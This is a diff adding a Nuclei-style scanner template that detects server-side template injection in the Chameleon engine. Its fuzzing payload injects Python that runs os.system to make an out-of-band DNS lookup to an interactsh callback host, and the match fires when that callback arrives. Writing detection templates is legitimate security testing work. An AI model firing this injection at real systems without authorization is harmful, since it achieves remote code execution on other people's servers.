@@ -1,0 +1,43 @@
+id: chameleon-oob
+
+info:
+  name: Chameleon - Out of Band Template Injection
+  author: 0xAwali,DhiyaneshDK
+  severity: high
+  reference:
+    - https://chameleon.readthedocs.io/en/latest/
+    - https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756
+  metadata:
+    verified: true
+  tags: ssti,dast,oast,oob,vuln
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+          - 'method == "POST"'
+          - 'method == "PUT"'
+    payloads:
+      injection:
+        - "<%3fpython+import+os%3f><%3fpython+os.system('nslookup+-type=SRV+{{interactsh-url}}')%3f>"
+
+    fuzzing:
+      - parts:
+          - query
+          - body
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    skip-variables-check: true
+
+    matchers:
+      - type: dsl
+        name: request-matcher
+        dsl:
+          - "contains(interactsh_protocol,'dns')"
+          - "contains(interactsh_request,'srv')"
+        condition: and
+# digest: 4a0a004730450220150fa952132870a9890d48ec0b20bfacdb16e26d76c65f6166f578fbbd12a1210221008f614b0bdc96068b9df58b28acce62189bb514f09acae99b20cdb3c354f6e7f6:922c64590222798bb761d5b6d8e72950
